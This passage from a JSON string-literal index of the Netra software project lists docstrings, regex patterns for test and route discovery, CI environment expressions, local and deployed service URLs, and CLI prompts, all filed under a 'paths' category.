          "value": "? (yes/no):",
          "category": "paths",
          "locations": []
        },
        "?host=/cloudsql/": {
          "value": "?host=/cloudsql/",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.AgentMetadata": {
          "value": "@/types/registry.AgentMetadata",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.AgentResult": {
          "value": "@/types/registry.AgentResult",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.AgentState": {
          "value": "@/types/registry.AgentState",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.AgentStatus": {
          "value": "@/types/registry.AgentStatus",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.AgentUpdatePayload": {
          "value": "@/types/registry.AgentUpdatePayload",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.Message": {
          "value": "@/types/registry.Message",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.MessageType": {
          "value": "@/types/registry.MessageType",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.Thread": {
          "value": "@/types/registry.Thread",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.ThreadMetadata": {
          "value": "@/types/registry.ThreadMetadata",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.ToolResultData": {
          "value": "@/types/registry.ToolResultData",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.User": {
          "value": "@/types/registry.User",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.UserMessagePayload": {
          "value": "@/types/registry.UserMessagePayload",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.WebSocketError": {
          "value": "@/types/registry.WebSocketError",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.WebSocketMessage": {
          "value": "@/types/registry.WebSocketMessage",
          "category": "paths",
          "locations": []
        },
        "@/types/registry.WebSocketMessageType": {
          "value": "@/types/registry.WebSocketMessageType",
          "category": "paths",
          "locations": []
        },
        "@\\w+\\.(get|post|put|delete|patch)\\s*\\(\\s*[\"\\']([^\"\\']+)": {
          "value": "@\\w+\\.(get|post|put|delete|patch)\\s*\\(\\s*[\"\\']([^\"\\']+)",
          "category": "paths",
          "locations": []
        },
        "@localhost:5432/mock": {
          "value": "@localhost:5432/mock",
          "category": "paths",
          "locations": []
        },
        "@mock\\.patch\\(": {
          "value": "@mock\\.patch\\(",
          "category": "paths",
          "locations": []
        },
        "@mock_justified\\(": {
          "value": "@mock_justified\\(",
          "category": "paths",
          "locations": []
        },
        "@patch\\(": {
          "value": "@patch\\(",
          "category": "paths",
          "locations": []
        },
        "@pytest\\.fixture": {
          "value": "@pytest\\.fixture",
          "category": "paths",
          "locations": []
        },
        "@pytest\\.fixture[^\\n]*\\ndef (\\w+)": {
          "value": "@pytest\\.fixture[^\\n]*\\ndef (\\w+)",
          "category": "paths",
          "locations": []
        },
        "@pytest\\.mark\\.skip": {
          "value": "@pytest\\.mark\\.skip",
          "category": "paths",
          "locations": []
        },
        "@router\\.(get|post|put|delete|patch)\\([\"\\'](.*?)[\"\\'].*?\\).*?\\n.*?def\\s+(\\w+)": {
          "value": "@router\\.(get|post|put|delete|patch)\\([\"\\'](.*?)[\"\\'].*?\\).*?\\n.*?def\\s+(\\w+)",
          "category": "paths",
          "locations": []
        },
        "ACT: \\$\\{\\{ env\\.ACT \\|\\| \\'false\\' \\}\\}": {
          "value": "ACT: \\$\\{\\{ env\\.ACT \\|\\| \\'false\\' \\}\\}",
          "category": "paths",
          "locations": []
        },
        "ACT_DETECTED: \\$\\{\\{ env\\.ACT \\|\\| \\'false\\' \\}\\}": {
          "value": "ACT_DETECTED: \\$\\{\\{ env\\.ACT \\|\\| \\'false\\' \\}\\}",
          "category": "paths",
          "locations": []
        },
        "ACT_DRY_RUN: \\$\\{\\{ env\\.ACT_DRY_RUN \\|\\| \\'true\\' \\}\\}": {
          "value": "ACT_DRY_RUN: \\$\\{\\{ env\\.ACT_DRY_RUN \\|\\| \\'true\\' \\}\\}",
          "category": "paths",
          "locations": []
        },
        "ACT_MOCK_GCP: \\$\\{\\{ env\\.ACT_MOCK_GCP \\|\\| \\'true\\' \\}\\}": {
          "value": "ACT_MOCK_GCP: \\$\\{\\{ env\\.ACT_MOCK_GCP \\|\\| \\'true\\' \\}\\}",
          "category": "paths",
          "locations": []
        },
        "ACT_RUNNER_NAME: \\$\\{\\{ env\\.ACT && \\'act-runner\\' \\|\\| \\'github-runner\\' \\}\\}": {
          "value": "ACT_RUNNER_NAME: \\$\\{\\{ env\\.ACT && \\'act-runner\\' \\|\\| \\'github-runner\\' \\}\\}",
          "category": "paths",
          "locations": []
        },
        "ACT_TEST_MODE: \\$\\{\\{ env\\.ACT \\|\\| \\'false\\' \\}\\}": {
          "value": "ACT_TEST_MODE: \\$\\{\\{ env\\.ACT \\|\\| \\'false\\' \\}\\}",
          "category": "paths",
          "locations": []
        },
        "API Docs: http://localhost:8080/docs": {
          "value": "API Docs: http://localhost:8080/docs",
          "category": "paths",
          "locations": []
        },
        "API Gateway Data Converter\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide data conversion functionality for API gateway\n- Value Impact: Enables data transformation tests to execute without import errors\n- Strategic Impact: Enables data transformation functionality validation": {
          "value": "API Gateway Data Converter\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide data conversion functionality for API gateway\n- Value Impact: Enables data transformation tests to execute without import errors\n- Strategic Impact: Enables data transformation functionality validation",
          "category": "paths",
          "locations": []
        },
        "API Gateway Load Balancer\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide load balancing functionality for tests\n- Value Impact: Enables load balancing tests to execute without import errors\n- Strategic Impact: Enables load balancing functionality validation": {
          "value": "API Gateway Load Balancer\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide load balancing functionality for tests\n- Value Impact: Enables load balancing tests to execute without import errors\n- Strategic Impact: Enables load balancing functionality validation",
          "category": "paths",
          "locations": []
        },
        "API Gateway Manager\n\nBusiness Value Justification (BVJ):\n- Segment: Mid/Enterprise (API management and security)\n- Business Goal: Centralized API traffic management and control\n- Value Impact: Enables scalable API operations with rate limiting, auth, and monitoring\n- Strategic Impact: Foundation for enterprise API management platform\n\nProvides centralized management of API gateway functionality.": {
          "value": "API Gateway Manager\n\nBusiness Value Justification (BVJ):\n- Segment: Mid/Enterprise (API management and security)\n- Business Goal: Centralized API traffic management and control\n- Value Impact: Enables scalable API operations with rate limiting, auth, and monitoring\n- Strategic Impact: Foundation for enterprise API management platform\n\nProvides centralized management of API gateway functionality.",
          "category": "paths",
          "locations": []
        },
        "API URL: http://localhost:": {
          "value": "API URL: http://localhost:",
          "category": "paths",
          "locations": []
        },
        "ARRAY\\[.*\\]": {
          "value": "ARRAY\\[.*\\]",
          "category": "paths",
          "locations": []
        },
        "ARRAY\\s*\\[([^\\]]+)\\]": {
          "value": "ARRAY\\s*\\[([^\\]]+)\\]",
          "category": "paths",
          "locations": []
        },
        "Add custom field to audit context (for testing/extension).": {
          "value": "Add custom field to audit context (for testing/extension).",
          "category": "paths",
          "locations": []
        },
        "Add dynamic security headers based on request/response context.": {
          "value": "Add dynamic security headers based on request/response context.",
          "category": "paths",
          "locations": []
        },
        "Add metadata? (y/n):": {
          "value": "Add metadata? (y/n):",
          "category": "paths",
          "locations": []
        },
        "Agent Manager for Supervisor\n\nBusiness Value Justification (BVJ):\n- Segment: Mid/Enterprise (workflow automation)\n- Business Goal: Efficient multi-agent coordination and lifecycle management\n- Value Impact: Enables scalable AI agent operations and resource optimization\n- Strategic Impact: Core component for enterprise AI automation workflows\n\nManages agent lifecycle, coordination, and resource allocation.": {
          "value": "Agent Manager for Supervisor\n\nBusiness Value Justification (BVJ):\n- Segment: Mid/Enterprise (workflow automation)\n- Business Goal: Efficient multi-agent coordination and lifecycle management\n- Value Impact: Enables scalable AI agent operations and resource optimization\n- Strategic Impact: Core component for enterprise AI automation workflows\n\nManages agent lifecycle, coordination, and resource allocation.",
          "category": "paths",
          "locations": []
        },
        "Agent Modification Tracking Helper\n\nThis script helps AI coding agents add or update tracking headers in modified files\naccording to the specification in SPEC/agent_tracking.xml.\n\nUsage:\n    python scripts/agent_tracking_helper.py <file_path> --agent \"Claude Code\" --model \"claude-opus-4-1\" --task-id \"conv_123\" --prompt \"Fix database query\" --changes \"Optimized query performance\"": {
          "value": "Agent Modification Tracking Helper\n\nThis script helps AI coding agents add or update tracking headers in modified files\naccording to the specification in SPEC/agent_tracking.xml.\n\nUsage:\n    python scripts/agent_tracking_helper.py <file_path> --agent \"Claude Code\" --model \"claude-opus-4-1\" --task-id \"conv_123\" --prompt \"Fix database query\" --changes \"Optimized query performance\"",
          "category": "paths",
          "locations": []
        },
        "Agent Test Validator - Comprehensive test runner and quality validator for critical agent tests.\n\nThis module discovers, executes, and validates all agent test suites with comprehensive metrics.\nMaximum 300 lines, 8 lines per function as per SPEC/conventions.xml.": {
          "value": "Agent Test Validator - Comprehensive test runner and quality validator for critical agent tests.\n\nThis module discovers, executes, and validates all agent test suites with comprehensive metrics.\nMaximum 300 lines, 8 lines per function as per SPEC/conventions.xml.",
          "category": "paths",
          "locations": []
        },
        "Agent supervisor shutdown timeout/error:": {
          "value": "Agent supervisor shutdown timeout/error:",
          "category": "paths",
          "locations": []
        },
        "Agent type definitions - imports from single source of truth in registry.py": {
          "value": "Agent type definitions - imports from single source of truth in registry.py",
          "category": "paths",
          "locations": []
        },
        "AgentStarted\\s*\\([^)]*\\)": {
          "value": "AgentStarted\\s*\\([^)]*\\)",
          "category": "paths",
          "locations": []
        },
        "Alert Manager Implementation\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide basic alert management functionality for tests\n- Value Impact: Ensures alert management tests can execute without import errors\n- Strategic Impact: Enables alerting functionality validation": {
          "value": "Alert Manager Implementation\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide basic alert management functionality for tests\n- Value Impact: Ensures alert management tests can execute without import errors\n- Strategic Impact: Enables alerting functionality validation",
          "category": "paths",
          "locations": []
        },
        "Alerting Service for monitoring and notifications\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal (affects all tiers)\n- Business Goal: Proactive issue detection and resolution\n- Value Impact: Prevents customer-impacting outages and reduces MTTR\n- Strategic Impact: Maintains 99.9% uptime SLA and customer trust": {
          "value": "Alerting Service for monitoring and notifications\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal (affects all tiers)\n- Business Goal: Proactive issue detection and resolution\n- Value Impact: Prevents customer-impacting outages and reduces MTTR\n- Strategic Impact: Maintains 99.9% uptime SLA and customer trust",
          "category": "paths",
          "locations": []
        },
        "Analyzes GitHub repositories for AI/LLM usage": {
          "value": "Analyzes GitHub repositories for AI/LLM usage",
          "category": "paths",
          "locations": []
        },
        "Analyzing netra_backend/app...": {
          "value": "Analyzing netra_backend/app...",
          "category": "paths",
          "locations": []
        },
        "Analyzing netra_backend/tests...": {
          "value": "Analyzing netra_backend/tests...",
          "category": "paths",
          "locations": []
        },
        "Architecture Compliance Checker - Main Entry Point\nEnforces CLAUDE.md architectural rules using modular design.\n\nThis script has been refactored into focused modules under scripts/compliance/\nto comply with the 450-line file limit and 25-line function limit.": {
          "value": "Architecture Compliance Checker - Main Entry Point\nEnforces CLAUDE.md architectural rules using modular design.\n\nThis script has been refactored into focused modules under scripts/compliance/\nto comply with the 450-line file limit and 25-line function limit.",
          "category": "paths",
          "locations": []
        },
        "Architecture compliance analyzer - Checks 300/8 limits.": {
          "value": "Architecture compliance analyzer - Checks 300/8 limits.",
          "category": "paths",
          "locations": []
        },
        "Architecture compliance checking module.\n\nChecks compliance against 300/8 line limits.\nFollows 450-line limit with 25-line function limit.": {
          "value": "Architecture compliance checking module.\n\nChecks compliance against 300/8 line limits.\nFollows 450-line limit with 25-line function limit.",
          "category": "paths",
          "locations": []
        },
        "AsyncMock\\(": {
          "value": "AsyncMock\\(",
          "category": "paths",
          "locations": []
        },
        "AsyncMock\\(\\)": {
          "value": "AsyncMock\\(\\)",
          "category": "paths",
          "locations": []
        },
        "AttributeError: '(\\w+)' object has no attribute '(\\w+)'": {
          "value": "AttributeError: '(\\w+)' object has no attribute '(\\w+)'",
          "category": "paths",
          "locations": []
        },
        "Audit middleware for request/response logging and security tracking.": {
          "value": "Audit middleware for request/response logging and security tracking.",
          "category": "paths",
          "locations": []
        },
        "Auth Service Configuration\nHandles environment variable loading with staging/production awareness": {
          "value": "Auth Service Configuration\nHandles environment variable loading with staging/production awareness",
          "category": "paths",
          "locations": []
        },
        "Auth Service Database Connection - Async-Only Implementation\nUnified async database connection management for auth service\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Auth service reliability and performance\n- Value Impact: Consistent async patterns, improved auth response times\n- Strategic Impact: Enables scalable authentication for enterprise": {
          "value": "Auth Service Database Connection - Async-Only Implementation\nUnified async database connection management for auth service\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Auth service reliability and performance\n- Value Impact: Consistent async patterns, improved auth response times\n- Strategic Impact: Enables scalable authentication for enterprise",
          "category": "paths",
          "locations": []
        },
        "Auth service specific test configuration.\nDepends on root /tests/conftest.py for common fixtures and environment setup.": {
          "value": "Auth service specific test configuration.\nDepends on root /tests/conftest.py for common fixtures and environment setup.",
          "category": "paths",
          "locations": []
        },
        "Auth:     https://netra-auth-jmujvwwf7q-uc.a.run.app": {
          "value": "Auth:     https://netra-auth-jmujvwwf7q-uc.a.run.app",
          "category": "paths",
          "locations": []
        },
        "Authentication Constants Migration Utility\n\nThis script helps identify and migrate hardcoded auth-related strings to use\nthe centralized auth constants module.\n\nBusiness Value: Platform/Internal - Reduces technical debt and improves\nsecurity consistency by eliminating hardcoded auth strings.\n\nUsage:\n    python scripts/auth_constants_migration.py --check\n    python scripts/auth_constants_migration.py --migrate --dry-run\n    python scripts/auth_constants_migration.py --migrate": {
          "value": "Authentication Constants Migration Utility\n\nThis script helps identify and migrate hardcoded auth-related strings to use\nthe centralized auth constants module.\n\nBusiness Value: Platform/Internal - Reduces technical debt and improves\nsecurity consistency by eliminating hardcoded auth strings.\n\nUsage:\n    python scripts/auth_constants_migration.py --check\n    python scripts/auth_constants_migration.py --migrate --dry-run\n    python scripts/auth_constants_migration.py --migrate",
          "category": "paths",
          "locations": []
        },
        "AutoModel\\.from_pretrained": {
          "value": "AutoModel\\.from_pretrained",
          "category": "paths",
          "locations": []
        },
        "Backend API: http://localhost:8080": {
          "value": "Backend API: http://localhost:8080",
          "category": "paths",
          "locations": []
        },
        "Backend:  https://netra-backend-jmujvwwf7q-uc.a.run.app": {
          "value": "Backend:  https://netra-backend-jmujvwwf7q-uc.a.run.app",
          "category": "paths",
          "locations": []
        },
        "Background task manager shutdown timeout/error:": {
          "value": "Background task manager shutdown timeout/error:",
          "category": "paths",
          "locations": []
        },
        "Backpressure Service Implementation\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide basic backpressure management functionality for tests\n- Value Impact: Ensures backpressure management tests can execute without import errors\n- Strategic Impact: Enables backpressure management functionality validation": {
          "value": "Backpressure Service Implementation\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide basic backpressure management functionality for tests\n- Value Impact: Ensures backpressure management tests can execute without import errors\n- Strategic Impact: Enables backpressure management functionality validation",
          "category": "paths",
          "locations": []
        },
        "Backpressure Service Package\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Enable test execution and prevent backpressure import errors\n- Value Impact: Ensures test suite can import backpressure management dependencies\n- Strategic Impact: Maintains compatibility for backpressure functionality": {
          "value": "Backpressure Service Package\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Enable test execution and prevent backpressure import errors\n- Value Impact: Ensures test suite can import backpressure management dependencies\n- Strategic Impact: Maintains compatibility for backpressure functionality",
          "category": "paths",
          "locations": []
        },
        "Block CI/CD pipeline to prevent further degradation": {
          "value": "Block CI/CD pipeline to prevent further degradation",
          "category": "paths",
          "locations": []
        },
        "Block CI/CD pipeline.": {
          "value": "Block CI/CD pipeline.",
          "category": "paths",
          "locations": []
        },
        "Build HTTP/HTTPS URL.": {
          "value": "Build HTTP/HTTPS URL.",
          "category": "paths",
          "locations": []
        },
        "Build LLM error message with provider/model info.": {
          "value": "Build LLM error message with provider/model info.",
          "category": "paths",
          "locations": []
        },
        "Build validation result with pass/fail status and retry suggestions.": {
          "value": "Build validation result with pass/fail status and retry suggestions.",
          "category": "paths",
          "locations": []
        },
        "C:/Users/antho/OneDrive/Desktop/Netra/netra-core-generation-1": {
          "value": "C:/Users/antho/OneDrive/Desktop/Netra/netra-core-generation-1",
          "category": "paths",
          "locations": []
        },
        "C:\\Program Files (x86)\\GitHub CLI\\gh.exe": {
          "value": "C:\\Program Files (x86)\\GitHub CLI\\gh.exe",
          "category": "paths",
          "locations": []
        },
        "C:\\Program Files\\GitHub CLI\\gh.exe": {
          "value": "C:\\Program Files\\GitHub CLI\\gh.exe",
          "category": "paths",
          "locations": []
        },
        "C:\\Users\\antho\\OneDrive\\Desktop\\Netra\\netra-core-generation-1\\SPEC": {
          "value": "C:\\Users\\antho\\OneDrive\\Desktop\\Netra\\netra-core-generation-1\\SPEC",
          "category": "paths",
          "locations": []
        },
        "C:\\\\": {
          "value": "C:\\\\",
          "category": "paths",
          "locations": []
        },
        "C:\\\\Windows\\\\System32": {
          "value": "C:\\\\Windows\\\\System32",
          "category": "paths",
          "locations": []
        },
        "CONFIG_FILE: .github/workflow-config.yml": {
          "value": "CONFIG_FILE: .github/workflow-config.yml",
          "category": "paths",
          "locations": []
        },
        "Cache Metrics Service\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide cache metrics functionality for tests\n- Value Impact: Enables cache metrics tests to execute without import errors\n- Strategic Impact: Enables cache performance monitoring functionality validation": {
          "value": "Cache Metrics Service\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide cache metrics functionality for tests\n- Value Impact: Enables cache metrics tests to execute without import errors\n- Strategic Impact: Enables cache performance monitoring functionality validation",
          "category": "paths",
          "locations": []
        },
        "Calculate actual ahead/behind counts.": {
          "value": "Calculate actual ahead/behind counts.",
          "category": "paths",
          "locations": []
        },
        "Calculate adaptive delay based on recent success/failure patterns.": {
          "value": "Calculate adaptive delay based on recent success/failure patterns.",
          "category": "paths",
          "locations": []
        },
        "Calculate bonus for before/after comparisons": {
          "value": "Calculate bonus for before/after comparisons",
          "category": "paths",
          "locations": []
        },
        "Calculate connection latency from ping/pong.": {
          "value": "Calculate connection latency from ping/pong.",
          "category": "paths",
          "locations": []
        },
        "Calculate current generation rate in records/second": {
          "value": "Calculate current generation rate in records/second",
          "category": "paths",
          "locations": []
        },
        "Calculate how novel/unique vs boilerplate the content is": {
          "value": "Calculate how novel/unique vs boilerplate the content is",
          "category": "paths",
          "locations": []
        },
        "Calculate success rate from success/failure counts.": {
          "value": "Calculate success rate from success/failure counts.",
          "category": "paths",
          "locations": []
        },
        "Change scope (File/Component/Module/System)": {
          "value": "Change scope (File/Component/Module/System)",
          "category": "paths",
          "locations": []
        },
        "Change type (Feature/Bugfix/Refactor/etc)": {
          "value": "Change type (Feature/Bugfix/Refactor/etc)",
          "category": "paths",
          "locations": []
        },
        "Channel endpoint/URL": {
          "value": "Channel endpoint/URL",
          "category": "paths",
          "locations": []
        },
        "Check architecture compliance (300/8 limits).": {
          "value": "Check architecture compliance (300/8 limits).",
          "category": "paths",
          "locations": []
        },
        "Check architecture compliance against 300/8 limits.": {
          "value": "Check architecture compliance against 300/8 limits.",
          "category": "paths",
          "locations": []
        },
        "Check architecture compliance with enhanced CI/CD features": {
          "value": "Check architecture compliance with enhanced CI/CD features",
          "category": "paths",
          "locations": []
        },
        "Check data integrity after compression/decompression cycle.": {
          "value": "Check data integrity after compression/decompression cycle.",
          "category": "paths",
          "locations": []
        },
        "Check for TODO/FIXME comments": {
          "value": "Check for TODO/FIXME comments",
          "category": "paths",
          "locations": []
        },
        "Check for duplicate handler/manager patterns": {
          "value": "Check for duplicate handler/manager patterns",
          "category": "paths",
          "locations": []
        },
        "Check if API is fast/health API.": {
          "value": "Check if API is fast/health API.",
          "category": "paths",
          "locations": []
        },
        "Check if an error is retryable (transient network/database issues).": {
          "value": "Check if an error is retryable (transient network/database issues).",
          "category": "paths",
          "locations": []
        },
        "Check if component is resource-related (memory/CPU).": {
          "value": "Check if component is resource-related (memory/CPU).",
          "category": "paths",
          "locations": []
        },
        "Check if component is service-related (database/redis).": {
          "value": "Check if component is service-related (database/redis).",
          "category": "paths",
          "locations": []
        },
        "Check if file is an example/demo file": {
          "value": "Check if file is an example/demo file",
          "category": "paths",
          "locations": []
        },
        "Check if file should be skipped (test/example files)": {
          "value": "Check if file should be skipped (test/example files)",
          "category": "paths",
          "locations": []
        },
        "Check if function is in critical agent/data paths": {
          "value": "Check if function is in critical agent/data paths",
          "category": "paths",
          "locations": []
        },
        "Check if line contains real credential (not test/mock)": {
          "value": "Check if line contains real credential (not test/mock)",
          "category": "paths",
          "locations": []
        },
        "Circuit Breaker Manager Implementation\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide basic circuit breaker management functionality for tests\n- Value Impact: Ensures circuit breaker tests can execute without import errors\n- Strategic Impact: Enables circuit breaker functionality validation": {
          "value": "Circuit Breaker Manager Implementation\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Provide basic circuit breaker management functionality for tests\n- Value Impact: Ensures circuit breaker tests can execute without import errors\n- Strategic Impact: Enables circuit breaker functionality validation",
          "category": "paths",
          "locations": []
        },
        "Circuit Breaker Manager for API Gateway\n\nBusiness Value Justification (BVJ):\n- Segment: Mid/Enterprise (reliability and performance)\n- Business Goal: Prevent cascade failures and maintain service availability\n- Value Impact: Ensures API stability under high load and failure conditions\n- Strategic Impact: Critical for enterprise-grade API reliability\n\nManages circuit breakers for API endpoints with intelligent failure detection.": {
          "value": "Circuit Breaker Manager for API Gateway\n\nBusiness Value Justification (BVJ):\n- Segment: Mid/Enterprise (reliability and performance)\n- Business Goal: Prevent cascade failures and maintain service availability\n- Value Impact: Ensures API stability under high load and failure conditions\n- Strategic Impact: Critical for enterprise-grade API reliability\n\nManages circuit breakers for API endpoints with intelligent failure detection.",
          "category": "paths",
          "locations": []
        },
        "Circuit Breaker Service Package\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Enable test execution and prevent circuit breaker import errors\n- Value Impact: Ensures test suite can import circuit breaker dependencies\n- Strategic Impact: Maintains compatibility for circuit breaker functionality": {
          "value": "Circuit Breaker Service Package\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Enable test execution and prevent circuit breaker import errors\n- Value Impact: Ensures test suite can import circuit breaker dependencies\n- Strategic Impact: Maintains compatibility for circuit breaker functionality",
          "category": "paths",
          "locations": []
        },
        "Cleared all pending/sending message queues to prevent memory leaks": {
          "value": "Cleared all pending/sending message queues to prevent memory leaks",
          "category": "paths",
          "locations": []
        },
        "ClickHouse HTTP/Native pools": {
          "value": "ClickHouse HTTP/Native pools",
          "category": "paths",
          "locations": []
        },
        "ClickHouse index optimization and management.\n\nThis module provides ClickHouse-specific database optimization\nwith proper async/await handling and modular architecture.": {
          "value": "ClickHouse index optimization and management.\n\nThis module provides ClickHouse-specific database optimization\nwith proper async/await handling and modular architecture.",
          "category": "paths",
          "locations": []
        },
        "Code Review System Package\nImplements SPEC/review.xml for automated code quality validation.": {
          "value": "Code Review System Package\nImplements SPEC/review.xml for automated code quality validation.",
          "category": "paths",
          "locations": []
        },
        "Comprehensive E2E Import Fixer\nFixes all known import issues in e2e tests based on actual errors found.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform  \n- Business Goal: Testing Reliability\n- Value Impact: Ensures all e2e tests can load and run properly\n- Strategic Impact: Prevents CI/CD failures and improves test coverage": {
          "value": "Comprehensive E2E Import Fixer\nFixes all known import issues in e2e tests based on actual errors found.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform  \n- Business Goal: Testing Reliability\n- Value Impact: Ensures all e2e tests can load and run properly\n- Strategic Impact: Prevents CI/CD failures and improves test coverage",
          "category": "paths",
          "locations": []
        },
        "Comprehensive E2E Test Fixer Script\n\nBUSINESS VALUE JUSTIFICATION (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Ensure reliable test suite for production deployments\n- Value Impact: Prevents regressions that could cost $50K+ in lost revenue\n- Strategic Impact: Automated test fixing enables rapid development cycles\n\nThis script systematically identifies and fixes common e2e test issues:\n1. Missing fixtures\n2. Import errors\n3. Incomplete test implementations\n4. Syntax issues": {
          "value": "Comprehensive E2E Test Fixer Script\n\nBUSINESS VALUE JUSTIFICATION (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Ensure reliable test suite for production deployments\n- Value Impact: Prevents regressions that could cost $50K+ in lost revenue\n- Strategic Impact: Automated test fixing enables rapid development cycles\n\nThis script systematically identifies and fixes common e2e test issues:\n1. Missing fixtures\n2. Import errors\n3. Incomplete test implementations\n4. Syntax issues",
          "category": "paths",
          "locations": []
        },
        "Comprehensive Enforcement Tools for Netra Codebase\nCreates production-ready tools that enforce CLAUDE.md architectural rules:\n- 450-line file limit\n- 25-line function limit\n- No test stubs in production code\n- No duplicate type definitions\n\nThese tools are designed for CI/CD integration and large codebase analysis.": {
          "value": "Comprehensive Enforcement Tools for Netra Codebase\nCreates production-ready tools that enforce CLAUDE.md architectural rules:\n- 450-line file limit\n- 25-line function limit\n- No test stubs in production code\n- No duplicate type definitions\n\nThese tools are designed for CI/CD integration and large codebase analysis.",
          "category": "paths",
          "locations": []
        },
        "Comprehensive mock analysis script to identify all mocked tests/functions.\nFinds mocks without justifications and categorizes them for remediation.": {
          "value": "Comprehensive mock analysis script to identify all mocked tests/functions.\nFinds mocks without justifications and categorizes them for remediation.",
          "category": "paths",
          "locations": []
        },
        "Configuration for database/service installation": {
          "value": "Configuration for database/service installation",
          "category": "paths",
          "locations": []
        },
        "ConnectionManager\\(\\)": {
          "value": "ConnectionManager\\(\\)",
          "category": "paths",
          "locations": []
        },
        "Consider consolidating into single handler/manager": {
          "value": "Consider consolidating into single handler/manager",
          "category": "paths",
          "locations": []
        },
        "Consider switching to smaller/cheaper model": {
          "value": "Consider switching to smaller/cheaper model",
          "category": "paths",
          "locations": []
        },
        "Context Isolation Security Module\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise (security and compliance)\n- Business Goal: Ensure strict tenant/context isolation\n- Value Impact: Critical for multi-tenant security compliance\n- Strategic Impact: Essential for enterprise security requirements\n\nProvides context isolation management for agents and services.": {
          "value": "Context Isolation Security Module\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise (security and compliance)\n- Business Goal: Ensure strict tenant/context isolation\n- Value Impact: Critical for multi-tenant security compliance\n- Strategic Impact: Essential for enterprise security requirements\n\nProvides context isolation management for agents and services.",
          "category": "paths",
          "locations": []
        },
        "Continue? (yes/no):": {
          "value": "Continue? (yes/no):",
          "category": "paths",
          "locations": []
        },
        "Convert async database URL to sync for Alembic.\n    \n    Handles various PostgreSQL URL formats:\n    - postgresql:// -> postgresql+psycopg2://\n    - postgres:// -> postgresql+psycopg2://\n    - postgresql+asyncpg:// -> postgresql+psycopg2://": {
          "value": "Convert async database URL to sync for Alembic.\n    \n    Handles various PostgreSQL URL formats:\n    - postgresql:// -> postgresql+psycopg2://\n    - postgres:// -> postgresql+psycopg2://\n    - postgresql+asyncpg:// -> postgresql+psycopg2://",
          "category": "paths",
          "locations": []
        },
        "Convert postgres:// to postgresql+asyncpg://": {
          "value": "Convert postgres:// to postgresql+asyncpg://",
          "category": "paths",
          "locations": []
        },
        "Convert postgresql:// to postgresql+asyncpg://": {
          "value": "Convert postgresql:// to postgresql+asyncpg://",
          "category": "paths",
          "locations": []
        },
        "Core WebSocket heartbeat manager.\n\nManages heartbeat/ping-pong functionality to detect dead connections\nand maintain connection health.": {
          "value": "Core WebSocket heartbeat manager.\n\nManages heartbeat/ping-pong functionality to detect dead connections\nand maintain connection health.",
          "category": "paths",
          "locations": []
        },
        "Corpus Admin Tool Models\n\nData structures for corpus admin tools including enums, request/response models.\nAll functions maintain 25-line limit with single responsibility.": {
          "value": "Corpus Admin Tool Models\n\nData structures for corpus admin tools including enums, request/response models.\nAll functions maintain 25-line limit with single responsibility.",
          "category": "paths",
          "locations": []
        },
        "Cost tracking service for AI operations.\n\nBusiness Value Justification (BVJ):\n- Segment: All tiers (cost optimization impacts all users)\n- Business Goal: Track and optimize LLM/AI costs across operations\n- Value Impact: Provides visibility into cost drivers for optimization\n- Revenue Impact: Enables cost-conscious operations and budget management": {
          "value": "Cost tracking service for AI operations.\n\nBusiness Value Justification (BVJ):\n- Segment: All tiers (cost optimization impacts all users)\n- Business Goal: Track and optimize LLM/AI costs across operations\n- Value Impact: Provides visibility into cost drivers for optimization\n- Revenue Impact: Enables cost-conscious operations and budget management",
          "category": "paths",
          "locations": []
        },
        "Could not find run_server.py": {
          "value": "Could not find run_server.py",
          "category": "paths",
          "locations": []
        },
        "Could not get/create thread for user": {
          "value": "Could not get/create thread for user",
          "category": "paths",
          "locations": []
        },
        "Count deprecated function/method usage.": {
          "value": "Count deprecated function/method usage.",
          "category": "paths",
          "locations": []
        },
        "Create CI/CD pipeline block action.": {
          "value": "Create CI/CD pipeline block action.",
          "category": "paths",
          "locations": []
        },
